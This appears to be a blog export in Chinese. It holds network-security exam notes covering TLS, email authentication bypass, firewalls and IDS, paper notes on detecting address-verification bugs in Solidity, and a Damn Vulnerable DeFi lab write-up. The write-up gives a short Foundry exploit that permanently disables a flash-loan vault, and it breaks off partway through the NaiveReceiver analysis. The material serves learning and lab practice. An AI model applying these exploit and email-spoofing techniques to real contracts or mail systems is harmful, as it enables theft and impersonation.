<p>①最小权限②数据保护③更新机制④使用安全的第三方库</p>
<h4 id="http-cookie安全策略">[4-2-3-3] HTTP Cookie安全策略</h4>
<p>通过设置不同的安全字段，保证cookie的安全。</p>
<p>Secure：cookie只通过HTTPS传输。HTTPOnly：拒绝JS代码访问cookie。SameSite：设置第三方站点何时可以在跨站点请求中携带cookie。
除了这些字段以外，还可以设置cookie过期时间，以及Domain和Path的限制。</p>
<h4 id="https">[4-2-3-4] HTTPS</h4>
<p>HTTPS是指 HTTP on
TLS，TLS可以分为握手协议、记录协议和告警协议。其中记录协议可以看作外壳协议，专门用来加解密数据包、验证、完整性检验和压缩解压缩的。
告警协议是指收到不正确的数据包时如何通知会话对方。下面着重描述记录协议。</p>
<p>首先，客户端发送ClientHello消息，其中包括客户端的安全能力。然后服务器发送Serverhello消息，其中包括服务器选择的各个参数。
然后服务器发送证书，该证书包含证书链的多个证书，包括服务器证书、签发该服务器证书的CA证书，注意该证书可能不包括根CA证书，因为浏览器可能预装了所有的根CA证书。
之后，服务器发送ServerKeyExchange消息，这条消息包含的是密钥协商所需要的额外数据，有些算法不需要就不用发，比如RSA。
之后，服务器发送certificateRequest消息，只有服务器要求客户端用公钥证书证明身份时才会发送这一条消息。
之后，服务器发送ServerHelloDone消息，告知客户端服务器这边的消息已经全部发送完毕。</p>
<p>如果收到CertificateRequest消息，客户端首先发送自己的证书给服务器。之后，为了完成密钥协商，客户端发送ClientKeyExchange消息。
之后，如果收到CertificateRequest消息，客户端还会发送CertificateVerify消息，发送一条包含客户端证书对应的私钥对握手消息的数字签名，
通过这条消息，服务器可以验证从握手开始到现在所有消息未被篡改并且没有被重放，因为握手消息中包含客户端和服务器生成的随机数，保证不被重放。
之后，客户端和服务器都向对方发送ChangeCipherSpec，表明自己已经完成密钥协商，之后所有消息都是加密的，这条消息是独立协议，并不属于握手子协议。
最后，双方发送Finished消息，这条消息是加密数据的第一条消息，包含了握手阶段所有消息的哈希值，主要意义在于验证握手的完整性，防止中间人攻击。</p>
<h4 id="cdn">[4-2-3-5] CDN</h4>
<p>CDN(Content Distribution
Network)内容分发网络是在不同地理位置设置代理服务器，
把web网站的内容分散到更接近用户的地方。</p>
<p>CDN的功能：①均衡网络负载②抗DoS攻击③保证网络更加稳定④降低网络延迟⑤过滤恶意web访问</p>
<h2 id="邮件系统">[4-3] 邮件系统</h2>
<h3 id="概述">[4-3-1] 概述</h3>
<p>用户通过MUA(Mail User
Agent)编写、发送、接收和管理邮件，当用户X通过MUA发送邮件给用户Y时，
邮件会先被提交给X的MSA(Mail Sending Agent),MSA再把邮件推送到X的MTA(Mail
Transition Agent)中，
X的MTA会将邮件发送给Y的MTA，Y的MTA再将邮件交给MDA(Mail Delivery
Agent)来投递给Y的MUA。</p>
<p>总结一下，每个用户都有自己的MUA，发件人邮件供应商会配置一个MSA一个MTA，收件人邮件供应商会配置一个MDA一个MTA。
另外，MTA往往是域名的邮件服务器。</p>
<h3 id="协议-3">[4-3-2] 协议</h3>
<h4 id="smtp">[4-3-2-1] SMTP</h4>
<p>对每一条命令，服务器都会回复相应信息</p>
<h4 id="pop3">[4-3-2-2] POP3</h4>
<p>离线邮件协议，对每一条命令服务器都会回复相应信息</p>
<h4 id="imap4">[4-3-2-3] IMAP4</h4>
<p>分布式存储存储邮件保证服务器与客户端的同步，在线操作和阅读服务器上的邮件</p>
<h3 id="常见攻击-2">[4-3-3] 常见攻击</h3>
<p>垃圾邮件、钓鱼邮件</p>
<blockquote>
<p>造成下列攻击的根本原因是：多协议之间的薄弱环节、多角色之间的薄弱环节和多服务之间的薄弱环节。</p>
</blockquote>
<h4 id="身份验证标识符不一致">[4-3-3-1] 身份验证标识符不一致</h4>
<blockquote>
<p>建议学习[4-3-4]后再来学习本节</p>
</blockquote>
<p>通常情况下，MUA显示的是FROM字段的内容。</p>
<ol type="1">
<li><p>空 Mail FROM
攻击：SPF检验的是一个服务器是否可以代替其服务器发送，当MAIL FROM为空时，
SPF协议要通过HELO字段来完成SPF验证，因此攻击者可以将HELO字段设置为恶意域名，然后FROM字段设置为正常邮箱，
这样受害者看到的发件人是FROM字段，HELO字段还能绕过SPF。</p></li>
<li><p>多FROM标头：攻击者可以在一个FROM写上自己的邮箱，然后在另一个FROM写上正常邮箱，最后用自己的签名完成DMARC验证。
这样不仅可以完成DMARC验证，还能让受害者看到FROM是正常邮箱。</p></li>
<li><p>多邮件地址攻击：攻击者在同一个FROM写入合法邮箱和自己的邮箱，同时用自己的签名签署邮件，可以达到与多FROM攻击一样的效果</p></li>
<li><p>不存在子域名攻击：当域名没有MX记录时，会使用域名的A记录。这意味着所有的A记录都是合法的域名，
又因为知名网站大多都会配置带有通配符的DNS
A记录，因此这种攻击较为广泛。这种邮件会被SPF打上none标签，
但往往不会被MTA邮件直接拒收。</p></li>
</ol>
<h4 id="身份验证结果注入攻击">[4-3-3-2] 身份验证结果注入攻击</h4>
<blockquote>
<p>建议学习[4-3-4]后再来学习本节</p>
</blockquote>
<p>DKIM注入是利用"b="字段将左括号认为是注释的原理来绕过，SPF注入是利用MAIL
FROM字段将单引号认为是注释的原理来绕过。</p>
<h4 id="dkim签名重放">[4-3-3-3] DKIM签名重放</h4>
<blockquote>
<p>建议学习[4-3-4]后再来学习本节</p>
</blockquote>
<p>DKIM不防重放，并且允许攻击者将额外的电子邮件标头甚至正文添加到被签名保护的消息中。</p>
<ol type="1">
<li><p>"h=":
DKIM对于邮件标头的签名是可选的，如果h=中包含的标头不完整，重放攻击者可以修改那些未受保护的标头而不会使DKIM签名失效。</p></li>
<li><p>如果不同组件以不同方式解析额外的邮件标头，攻击者可以通过在签名邮件中添加新标头来制造混淆。比如如果DKIM使用原subject，那MUA显示的就是恶意Subject。</p></li>
<li><p>"l=":
该标签允许向电子邮件列表中的不同地址发送不同内容，另外该标签允许攻击者在原始邮件正文添加新的而已内容而不会破坏签名。</p></li>
<li><p>利用转发功能：通常知名的邮件转发服务器不会被过滤</p></li>
</ol>
<h4 id="身份验证绕过攻击">[4-3-3-4] 身份验证绕过攻击</h4>
<blockquote>
<p>建议学习[4-3-4]后再来学习本节</p>
</blockquote>
<p>共享MTA场景：多个域名共享一个合法MTA，如果接收方只验证MTA
IP则会有安全风险</p>
<p>直接MTA场景：攻击者不通过发送方MTA，而是直接连接到接收方MTA来发送邮件，这样接收方MTA可能不会验证邮件。</p>
<p>转发MTA场景：攻击者利用受信任的转发MTA来发送。</p>
<h3 id="常见防护">[4-3-4] 常见防护</h3>
<h4 id="spf">[4-3-4-1] SPF</h4>
<p>通过SPF记录指明哪些服务器可以代表域名发送电子邮件到MSA，SPF记录以DNS
TXT记录的形式发布， 一个域名只能发布一条记录。举个例子：</p>
<p><code>v=spf1 ip4:192.168.1.0/24 mx include:spf.example.net ~all</code>这条记录的含义是：</p>
<p>ip4:192.168.1.0/24：允许来自 192.168.1.0/24
子网的IP地址发送邮件。</p>
<p>mx：允许来自 example.com 域的MX记录指向的IP地址发送邮件。</p>
<p>include:spf.example.net：允许 spf.example.net
域的SPF记录中的IP地址发送邮件。</p>
<p>~all：如果邮件来源不符合这些规则，则标记为软失败（通常会被标记为垃圾邮件）。</p>
<p>当MUA接收到一封邮件时，SPF协议会提取MAIL
FROM字段中的域名，通过DNS查询来确认是否匹配。</p>
<h4 id="dkim">[4-3-4-2] DKIM</h4>
<p>DKIM协议会在邮件的标头添加一个数字签名，这个签名是这样计算的：</p>
<p>首先计算邮件正文的哈希值、选定邮件标头的哈希值以及整个邮件的哈希值。然后发件人的MTA会对哈希值进行签名，
生成DKIM-Signature。</p>
<h4 id="dmarc">[4-3-4-3] DMARC</h4>
<p>引入多认证标识符对齐机制，将FROM命令里的身份信息与SPF和DKIM的认证关联起来</p>
<h4 id="共享直接转发-mta-场景">[4-3-4-4] 共享/直接/转发 MTA 场景</h4>
<h1 id="防御技术">[5] 防御技术</h1>
<h2 id="防火墙">[5-1] 防火墙</h2>
<h3 id="概述-1">[5-1-1] 概述</h3>
<p>功能：①包过滤、入侵检测、监控和日志②负载均衡、应用程序代理服务器、数据缓存③网络地址转换</p>
<p>缺陷：①无法对抗旁路攻击②不完全透明，可能会带来延迟③不防范端到端加密通信④有时会拦截有用的服务</p>
<p>内部防火墙的部署：①内部防火墙提供更严格的过滤能力②在DMZ之间提供双向保护③多个防火墙保护内部网络的不同区域</p>
<h3 id="分类">[5-1-2] 分类</h3>
<blockquote>
<p>优缺点大一统:①应用层？②开销③配置难易④日志</p>
</blockquote>
<h4 id="包过滤防火墙">[5-1-2-1] 包过滤防火墙</h4>
<p>拦截依据：协议类型/IP地址/端口/流向的接口/IP选项/TCP选项/其他协议选项/流动方向</p>
<p>优点：①便于配置，检查效率高②对于用户是透明的</p>
<p>缺点：①粒度过粗②无法防御针对特定app漏洞的攻击③无法防御IP伪造攻击④日志信息有限</p>
<h4 id="状态检查防火墙">[5-1-2-2] 状态检查防火墙</h4>
<p>拦截依据：TCP等协议建立的状态+包过滤防火墙的拦截依据</p>
<p>优点：①建立连接跟踪，跟踪网络连接的状态，以便返回流量能通过防火墙②会话感知过滤，可以根据会话信息进行更细粒度的过滤③减少虚假报警，不会将合法的响应流量误以为是未经授权的入侵
-&gt; 其实就是粒度更细了、更适合TCP了、更精确了</p>
<p>缺点：①配置复杂②资源开销大③无法防御针对特定app漏洞的攻击④UDP效果较差</p>
<h4 id="应用层防火墙">[5-1-2-3] 应用层防火墙</h4>
<p>拦截依据：数据包头+数据包内容（模式匹配+正则匹配+协议分析）</p>
<p>优点：①过滤规则容易配置和测试②进行内容过滤、复杂访问控制、精细注册和审核等
③防御针对应用层的攻击④提供详细的日志和审计功能</p>
<p>缺点：①性能开销大②特定协议特定检查机制③可能引入新漏洞④配置复杂⑤误报误阻会封堵正常业务流程，需要额外测试和配置。</p>
<p>WAF：Web Application
Firewall，基于特征、行为和语义分析来检测恶意行为，可以作为独立硬件或虚拟设备部署在web前端，
可以通过云端waf在云中保护web应用，可以作为浏览器插件或应用，也能以反向代理模式部署</p>
<h4 id="其他类型">[5-1-2-4] 其他类型</h4>
<p>下一代防火墙</p>
<p>网络分割防火墙</p>
<p>云防火墙</p>
<h2 id="idsintrusion-detection-system">[5-2] IDS(Intrusion Detection
System)</h2>
<h3 id="p2dr模型">[5-2-1] <span
class="math inline">\(P^2DR模型\)</span></h3>
<p>策略：模型核心，其他方面围绕策略展开</p>
<p>防护：阻止侵入系统或延长侵入系统的时间，为检测和反应提供时间。主要包括：安全规章制定（在安全策略的基础上指定安全细则）、
系统安全配置（安装各种必要补丁，进行仔细配置）、采用安全措施（安装防火墙、IDS、VPN软件或设备）</p>
<p>检测：异常监视（发现系统异常行为，如异常登录）+模式发现（对已知的攻击模式进行匹配）</p>
<p>响应：报告（让管理员知道风险）+记录（记录入侵细节与系统反应）+反应（进行处理并防止进一步入侵，比如修复漏洞+增加防护措施）+
恢复（清楚入侵影响，让系统恢复正常）</p>
<h3 id="分类-1">[5-2-2] 分类</h3>
<h4 id="hids">[5-2-2-1] HIDS</h4>
<p>HIDS是基于主机的IDS，信息一般来源于操作系统的日志等。</p>
<p>优点：①检测NIDS无法察觉的攻击②HIDS的信息源不会被网络传输中的加密干扰③不受网络环境变化的影响④当HIDS运行在OS的审计线上时，可以检测特洛伊木马等针对软件完整性破坏的攻击</p>
<p>缺点：①必须为每个受监控的主机配置HIDS②HIDS可能被攻击禁用③性能损耗</p>
<h4 id="nids">[5-2-2-2] NIDS</h4>
<p>通常由一组放置在网络各个点的单一用途传感器组成，这些单元监控流量分析问题并向中央报告问题，他们用途单一更难被破坏，并且通常被设置为隐形的，难以被攻击者发现</p>
<p>优点：①使用被动接口捕获网络数据包②可扩展性好③OS独立的④提供更好的DoS防御</p>
<p>缺点：①如果流量被加密则无法检测②在现代交换网络上，NIDS变得困难③无法处理高速网络</p>
<h3 id="ids技术">[5-2-3] IDS技术</h3>
<h4 id="基于误用的入侵检测">[5-2-3-1] 基于误用的入侵检测</h4>
<p>将传入的网络流量特征与特征数据库中已经存在的先前入侵的特征进行匹配，分为静态签名检测和动态监测。
静态签名检测就是直接与数据库中的模式进行匹配，动态检测还关注行为的时间序列和状态变化。</p>
<h4 id="基于异常的检测">[5-2-3-2] 基于异常的检测</h4>
<p>根据系统行为或资源使用状态的正常程度来进行判断。</p>
<h1 id="xff-比较容易遗忘的点">[0xFF] 比较容易遗忘的点：</h1>
<p>下面是一些用于应试的背诵点，不考试的读者直接跳过即可。</p>
<p>分层带来的功能是：拆分与重组、封装、连接控制、顺序递交、流控制、出错控制和复用</p>
<p>bugs指的是软件程序中的错误或缺陷，vuln指的是系统需求、设计、实现或运行中的缺陷或弱点，
exploit指的是一段软件、一系列命令或一组数据利用vuln或bugs来引发计算机软件或硬件上的非预期行为</p>
<p>网络攻击可以分为：面向报文头的攻击、面向认证的攻击、面向协议的攻击和面向网络流的攻击。</p>
<ol type="1">
<li><p>分层带来的功能</p></li>
<li><p>bugs,vuln,==exp==</p></li>
<li><p>==网络攻击分类方式==</p></li>
<li><p>==IPSec的enchidala怎么来的==</p></li>
<li><p>==传输层:TCP攻击方式 + manimon==</p></li>
<li><p>==DNS报文解析，什么样的报文会被递归DNS接收，劫持型DNS
poison，响应型服务器做什么检查？DNS有哪些攻击方式？==</p></li>
<li><p>==web系统安全：css/js有哪些安全风险？服务器的风险（缓存没记住），web系统风险，cookieparams，第三方插件安全，tls工作阶段==</p></li>
<li><p>==邮件安全：绕过身份验证攻击，DKIM重放，根本原因==</p></li>
<li><p>防火墙：功能、缺陷、三种防火墙的原理和优缺点、其他类型防火墙、WAF、内部防火墙的部署</p></li>
<li><p>IDS：HIDS/NIDS的原理及优缺点，常见入侵，P2DR，IDS技术</p></li>
<li><p>arp投毒如何防护</p></li>
<li><p>缓存：①被注入②未授权的访问数据③字段错误导致访问问题④窃取行为习惯</p></li>
<li><p>web系统的风险有：①身份冒充②网络监听和中间人③DOS④针对应用的攻击</p></li>
<li><p>包过滤防火墙优点：高效开销小+透明，缺点：粒度粗容易误报漏报、不防御应用层漏洞、不防御IP伪造、日志提供有限</p></li>
<li><p>状态检测防火墙优点：建立连接跟踪，检测会话，减少虚假报警；缺点：配置复杂、开销大、不防御应用层漏洞、不适合UDP</p></li>
<li><p>应用层防火墙优点：能防御应用层、日志详细，缺点：配置复杂因地制宜+开销大+错误拦截多+第三方漏洞</p></li>
<li><p>WAF：基于特征、基于行为、基于语义分析</p></li>
<li><p>其他类型防火墙：</p></li>
<li><p>HIDS优点：检测加密前解密后的数据、不受交换网络影响、检测NIDS无法检测的内容、检测软件完整性破坏
缺点：开销大、因地制宜配置复杂、可能背攻击禁用</p></li>
<li><p>NIDS优点：被动捕获、扩展性好、OS独立、抗DoS。缺点：①受交换空间影响②无法检测加密内容③难以处理高速网络</p></li>
<li><p>常见入侵：蠕虫木马、钓鱼邮件、勒索病毒、APT、DoS</p></li>
<li><p>基于误用：模式匹配，静态只匹配静态表，动态还分析时间序列或状态变化等</p></li>
<li><p>静态mac表，开启路由器和网关的arp防护，用软件或中间件来检测arp</p></li>
</ol>
]]></content>
      <categories>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>blockchain - All Your Tokens are Belong to Us Demystifying Address Verification Vulnerabilities in Solidity Smart Contracts论文阅读笔记</title>
    <url>/posts/38292.html</url>
    <content><![CDATA[<blockquote class="blockquote-center">
单一漏洞 + 污点分析做到顶会，暑假就想复现了结果拖到现在
</blockquote>
<span id="more"></span>
<blockquote>
<p>年份：2024</p>
</blockquote>
<h1 id="abstract">[1] Abstract</h1>
<p>基于目前研究较少的address
verification漏洞，本文用污点分析实现了的“轻量级”专属扫描工具AVVerifier，检查了数百万的合约，找到了数百个有该漏洞的合约，并将其部署在链上成为实时检测工具，并成功检测到了一次数十万美元的攻击</p>
<h1 id="intro-background">[2] Intro &amp; Background</h1>
<h2 id="ethreum-primer">[2-1] Ethreum Primer</h2>
<p>大概讲了一下现在区块链非常火，自从以太坊和智能合约出现后，DApps的各种应用层出不穷，比如闪电贷等。指出为了防止漏报带来的经济损失，能保证soundness的静态符号执行常常被用到（mythril）</p>
<h2 id="whitelist-address-verification">[2-2] Whitelist address
verification</h2>
<blockquote>
<p>Beosin. Two vulnerabilities in one function: The analysis of visor
finance exploit. https://beosin.medium.com/two-vulnerabilities
in-one-function-the-analysis-of-visor finance-exploit-a15735e2492,
2023.</p>
</blockquote>
<p>这是一个地址验证的漏洞举例。这种漏洞的大意就是“如果'改变合约on-chain
state'的修改依赖于external
call，比如delegatedcall等，那很有可能就会被利用”</p>
<p>这种漏洞为什么难自动化检测？①要实现inter-contract or inter-procedural
analysis，但这样的分析会有效率或者有效性上的不足②合约大多数闭源，字节码层级缺乏语义③该漏洞需要memory和storage的细粒度跟踪</p>
<blockquote>
<p>DeFi Llama. Ethereum defi statistics. https://
defillama.com/chain/Ethereum, 2023. （基于total value
locked排出来的前40的DeFi项目）</p>
</blockquote>
<p>作者从上述DeFi项目中总结出来的核心漏洞原理，并将这些漏洞归纳为三种形式：硬编码、mapping和硬编码enum</p>
<h2 id="基于污点分析的地址验证">[2-3] 基于污点分析的地址验证</h2>
<p>作者在这里简略介绍了一下他们的方法：不考虑路径可能性，保留stack,memory和storage的值和污点传播状态，这样的静态模拟遍历了多数路径。函数参数中与address相关的设置为source，然后任意可能被利用的点都设置为sink。作者在这里提到2019年的一个工作是将sstore设置为sink。</p>
<h2 id="threat-model">[2-4] Threat Model</h2>
<p>作者在这里提出工作是建立在我们无法分辨攻击者和普通用户的区别之上的。攻击者不需要额外的特权，当然不能欺骗以太网网络的正确性，也不能做女巫攻击之类对区块链底层的攻击，也不能获取合法用户的私钥之类的。</p>
<h1 id="motivation">[3] Motivation</h1>
<h2 id="举例">[3-1] 举例</h2>
<p>作者总结了三种漏洞特征：①P1:参数有address并且缺少地址检查②P2:地址作为外部call跳转③P3:链上状态随之更新</p>
<h2 id="challenge">[3-2] Challenge</h2>
<p>作者归纳了要实现漏洞扫描的两个主要问题：</p>
<ol type="1">
<li><p>解决bytecode semantic缺失的问题 Pengxiang Ma, Ningyu He, Yuhua
Huang, Haoyu Wang, and Xiapu Luo. Abusing the ethereum smart contract
verification services for fun and profit. arXiv preprint
arXiv:2307.00549, 2023.
这篇说明了99%以上的以太坊合约都没有发布源码</p></li>
<li><p>基于控制流和数据流的跨函数分析非常困难</p></li>
</ol>
<h2
id="相关工作这里我没仔细看因为跟复现关系不是很大之后做工作拓展再去看">[3-3]
相关工作（这里我没仔细看，因为跟复现关系不是很大，之后做工作拓展再去看）</h2>
<p>动态分析方法往往资源开销大，
静态分析方法里形式验证和符号执行比较流行，但符号验证需要人们提前给每种漏洞做模板，普适度不够并且容易出错；符号执行就会出现路径爆炸的问题
而现有的污点分析工具中没有能直接检测该种漏洞的工具。</p>
<h1 id="design-of-avv">[4] Design of AVV</h1>
<p>AVV主要由Grapher，Simulator和Detector组成。</p>
<h2 id="grapher">[4-1] Grapher</h2>
<p>主要负责提取出目标函数CFG的子树。</p>
<p>输入bytecode，首先提取出包含函数实现的runtime
code，然后将code解析成bb，并依据jump关系构建出CFG。但有些jump关系是动态决定的而非在编译时就静态决定，因此只依据静态决定的jump来建构CFG（为了soundness做出的妥协）</p>
<p>启发性地筛出那些以address作为参数的函数（这就是所谓的heuristic-based
path selection
method，就是通过现有经验构建约束，减少需要选择的路径），具体来说就是那些与20字节0xFF...FF做AND运算的address参数。有这种参数的函数被标记为可疑函数送入Simulator。</p>
<h2 id="simulator">[4-2] Simulator</h2>
<p>这篇论文没用伪代码也把方法讲的很好，实属牛比</p>
<p>这个组件概括来说就是“在维护EVM数据结构的同时，更新污点状态”</p>
<p>具体来说，用户可控的变量包括ORIGIN，CALLDATA，BALANCE等。Simulator就是针对每一个opcode制定一系列规则，这些规则“在维护EVM数据结构的同时，更新污点状态”。为了不丢失普遍性，opcode被作者分为“①stack②load&amp;store③call④control
flow”四种。同时定义了一些数据结构，比如污点集T、危险参数集S、污点与污染源映射集CT等等</p>
<h3 id="stack-related-opcode">[4-2-1] Stack related opcode</h3>
<p>这些opcode只与栈交互，并且不改变控制流。</p>
<p>包括ADD，SWAP和DUP。拿ADD做例子，接受两个参数op1,op2作为输入，返回一个参数opk作为返回值。除了栈上必要的更新，作者也形式化了污点分析传播的规则：如果危险参数集S或污点集T中存在op1或op2，就将opk污染，并且将“污点与污染源映射集”CT[opk]更新（论文里有具体更新方式）</p>
<h3 id="load-store-related-opcode">[4-2-2] Load &amp; Store related
opcode</h3>
<p>作者将storage和memory都用key-value数据结构来存储（storage这样设计是因为EVM本身就是这么设计的，memory这样设计是因为memory很稀疏无需用大数组来存储），Sto[key]
or Mem[offset]</p>
<p>Load related opcode -
包括MLOAD和SLOAD，它们都接受一个参数tar，返回一个值ret。 -
污染规则为：①如果tar在S或T中，就将ret加入到T中。将CT[ret]更新为tar②以memory为例，Mem[tar]在S或T中，也将ret加入到T中，将CT[ret]更新为Mem[tar]，Storage同理
Store related - 包括SSTORE和MSTORE，接受参数val和dest -
污染规则为：如果val或dest在S或T中，就把val加入T中。将CT[val]更新为dest</p>
<h3 id="call-related-opcode">[4-2-3] Call related opcode</h3>
<p>可以导致external
call的opcode，比如CALL，DELEGATECALL和SELFDESTRUCT。</p>
<p>因为CALLDATALOAD是唯一一个可以解析address类型变量的opcode，因此我们只需要关注"上述opcode的address参数"(记为(param_address))在CT中有没有祖先是CALLDATALOAD就好了。换句话说，就是从CT[address]向前遍历到起点（一般是S中的某个成员），如果这个起点是CALLDATALOAD，就把suc（不懂suc是什么，success吗？）加入污点集，然后更新CT[suc]=param_address</p>
<h3 id="control-flow-related-opcode">[4-2-4] Control flow related
opcode</h3>
<p>有些控制流相关的opcode不带参数，比如RETURN，STOP，REVERT和INVALID，因此模拟这些opcode时没有污点传播，因此Simulator只模拟它们带来的控制流变化。比如遇到INVALID时，simulator会停止模拟本路径并切换到下一条路径。</p>
<p>对于JUMP和JUMPI，JUMP只是没有条件的JUMPI。对于JUMPI，它接受两个参数dest和cond并且什么都不返回；执行控制流跳转时有两条分支，fallthrough和jumpdest，前一条代表“如果条件不满足则顺序执行”，后一条代表“如果条件满足则跳转到jumpdest”。
参数dest是不依赖任何参数的，编译时就能确定。因此控制流变化规则根据“cond是否动态决定”来制定即可：</p>
<p>如果cond是常数，我没太看懂“由simulator决定选择fallthrough还是jumpdest”是什么意思</p>
<p>如果不是常数，两条路径都是可行的：</p>
<ul>
<li><p>如果cond的祖先是CALLDATALOAD（像call related
opcode一样），优先考虑jumpdest，为的是模拟攻击者成功绕过了检验机制。
-&gt; 这也是heuristic的地方</p></li>
<li><p>如果不是，两条路径都纳入考量。</p></li>
</ul>
<p>上述内容给人的感觉很主观，并没有给人严谨的感觉，即并没有通过实验来验证“为什么这样选择”，就像Taint-Fuzz一样，为什么会选择5-20作为评判标准。这就是所谓的heuristic.</p>
<p>作者解释这样做的好处是：①不像符号执行一样会有路径爆炸的问题②能忽略一些处理起来比较复杂但是对准确性没有帮助的内容，比如没有意义的getter</p>
<p>这种opcode没有返回值，所以没有污点传播规则，只有控制流变化。</p>
<h2 id="detector">[4-3] Detector</h2>
<p>基于前文Motivation提到的P1-P3制定检测规则。</p>
<p>第一阶段检测一个合约是否采用了白名单验证机制，检测逻辑可以描述为：</p>
<ul>
<li><p>如果一个参数不被标记为address类型，返回正常</p></li>
<li><p>如果对于每一个JUMPI，如果它的cond被参数j污染，参数j又能被CALLDATALOAD污染，就返回正常（我觉得这里是不是写错了）</p></li>
<li><p>如果上述两种情况都没有，就返回错误，意味着有可能出现问题，送到第二阶段检查</p></li>
</ul>
<p>第二阶段检查参数j是否能充当任一外部调用指令的目标。在以太坊中，外部调用将地址作为参数，并且允许当前合约与他们进行交互。检测逻辑可以描述为：如果外部调用指令的target的前导是受污染的paramj，或者target就是地址本身，则说明有可能有问题，送到第三阶段检查。返回false的合约被标记为没有利用价值的含漏洞合约，即虽然可以操控参数但无法进一步利用。</p>
<p>第三阶段考虑链上状态是否依据外部调用的返回值来更新。在以太坊中，链上状态有两种：一种可以看做普通变量并且直接修改，比如BALANCE；另一种是SSTORE存储的变量。因此我们把这些有价值的变量(链上状态关键词、SSTORE的var和dest)收录到sink集，一旦这些sink被污染则说明链上状态可以被改变。</p>
<h1 id="evaluation">[5] Evaluation</h1>
]]></content>
      <categories>
        <category>Blockchain</category>
      </categories>
      <tags>
        <tag>Blockchain</tag>
        <tag>Smart Contract vulnerabilities</tag>
      </tags>
  </entry>
  <entry>
    <title>blockchain - Damn Vulnerable Defi 靶场复现</title>
    <url>/posts/26167.html</url>
    <content><![CDATA[<blockquote class="blockquote-center">
继续刷题
</blockquote>
<span id="more"></span>
<h1 id="环境设置">[0] 环境设置</h1>
<p>我是用 forge 搭建的靶场，貌似还可以用 npm
之类的搭建，这样做题就直接用 web3.js 交互就可以了。</p>
<p>根据<a
href="https://github.com/theredguild/damn-vulnerable-defi">官方说明</a>搭建靶场环境。forge
可能由于网络原因会失败，多安装几次就好了</p>
<p><code>forge build</code>之后，本地有这样几个文件夹比较重要：</p>
<p><code>src</code>: 漏洞源码。要做的题目都在这里面</p>
<p><code>test</code>:
题解。如果想要解题，必须运行<code>forge test --mp test/&lt;题目名称&gt;/&lt;题目名称&gt;.t.sol -vv</code>，-vv是为了打印
emit
log，方便我们调试。而我们的攻击poc就要写在上面这个.t.sol文件的test_<题目名称>()这个函数中。</p>
<h1 id="unstoppable">[1] Unstoppable</h1>
<blockquote>
<p>漏洞类型：revert条件设置不当</p>
</blockquote>
<p>本题我们的目标是攻击闪电贷合约，让这个闪电贷在任何时候都无法工作。</p>
<p>闪电贷（Flash
Loan）是一种无需抵押的贷款形式，广泛用于去中心化金融（DeFi）领域。它的特别之处在于，贷款的整个过程（借款、使用资金、还款）必须在同一笔交易中完成。如果在交易结束时贷款没有被偿还，整个交易将被回滚，确保贷款人不会承担任何风险。</p>
<p>我们分析代码之后可以将漏洞定位在 flashLoan
函数里，因为只有当这个函数失败，monitor 里的 checkFlashLoan 才会 emit
一个 false。</p>
<p>而想要让 flashLoan 失败，有四个触发点：</p>
<ol type="1">
<li><p><code>if (amount == 0) revert InvalidAmount(0);</code></p></li>
<li><p><code>if (address(asset) != _token) revert UnsupportedCurrency();</code></p></li>
<li><p><code>if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance();</code></p></li>
<li><p><code>if ( ... != keccak256("IERC3156FlashBorrower.onFlashLoan")) &#123;revert CallbackFailed();&#125;</code></p></li>
</ol>
<p>第一个点，amount是传参，不是我们想要改变的状态变量</p>
<p>第二个点，asset在整个合约中除了构造函数有改变以外，没有我们可以控制的点</p>
<p>第四个点，这个函数签名不正确，这也是我们无法控制的。</p>
<p>所以很明显，我们需要攻击第三点。但为什么会莫名其妙有第三点这个限制？我们仔细来分析一下：</p>
<p>首先，balanceBefore 是 totalAssets() 的返回值，assets
是闪电贷合约里剩余的代币数目（注意这里是代币，而不是实际的
ether），supply 是闪电贷合约能供给的数目上限，也就是一开始给的
1_000_000e18 个 ERC20 token（DVT），这个数目是不会变的。</p>
<p>我们一开始拥有 10 个 DVT，如果给闪电贷合约转 1 个 DVT
的话，这里的convertToShares 函数返回值就永远是 999999999999999999999999
了,此时就永远关停这个闪电贷了。</p>
<p>exp 如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function test_unstoppable() public checkSolvedByPlayer &#123;</span><br><span class="line">    require(vault.convertToShares(vault.totalSupply()) == vault.totalAssets(),&quot;not equal&quot;);</span><br><span class="line">    emit log_named_uint(&quot;Total Supply&quot;, vault.totalSupply());</span><br><span class="line">    emit log_named_uint(&quot;Total Assets&quot;, vault.totalAssets());</span><br><span class="line">    require(token.transfer(address(vault), 1 wei));</span><br><span class="line">    emit log_named_uint(&quot;calc result&quot;, vault.convertToShares(vault.totalSupply()));</span><br><span class="line">    emit log_named_uint(&quot;Total Supply&quot;, vault.totalSupply());</span><br><span class="line">    emit log_named_uint(&quot;Total Assets&quot;, vault.totalAssets());</span><br><span class="line">    require(vault.convertToShares(vault.totalSupply()) != vault.totalAssets(),&quot;equal&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我突然意识到这个闪电贷是不是只要接收到 fee 立刻就 dead 了。。</p>
<h1 id="naivereceiver">[2] NaiveReceiver</h1>
<blockquote>
<p>漏洞类型：权限设置错误</p>
</blockquote>
<p>这道题要求我们把 receiver 里的 10 WETH 和 pool 里的 1000 WETH
全转移到 recovery 账户中。最后 isSolved 有四条限制：</p>
<ol type="1">
<li><p>player 调用的交易小于等于 2 条</p></li>
<li><p>receiver 的 weth 余额为0</p></li>
<li><p>pool 的 weth 余额为0</p></li>
<li><p>recovery 的 weth 余额为 1010</p></li>
</ol>
<p>很明显能看到 NaiveReceiverPool 合约中的 withdraw
权限设置的不对，任何人都可以调用这个函数取款。</p>
<p>但新版本的 solidity feature 卡了我好久...原来 0.8.0
之后的上溢/下溢都会自动检测了..也就是说没办法直接通过withdraw直接提款。</p>
<p>但这个合约还自己实现了 _msgSender 函数，当调用者是 trustedForwarder
时，_msgSender 函数就会将 msg.data的 最后 20byte
当作地址返回。也就是说，我们必须要通过 trustedForwarder 的 execute
方法来间接调用 withdraw。</p>
<p>除此之外，我们知道 deposits[deployer] 是有 1000WETH
的，deposits[receiver] 也有
10WETH，所以我们就有如下两种方法来转走这两个合约的 WETH：</p>
<p>第一种是通过闪电贷的 fee，把 receiver 里的 10WETH 转移到 deployer
中，然后一口气提干净。</p>
<p>第二种是提取一次 deployer，提取一次 receiver</p>
<p>但无论以上哪一种方法，都需要绕过上述的第一条限制：交易数小于等于 2
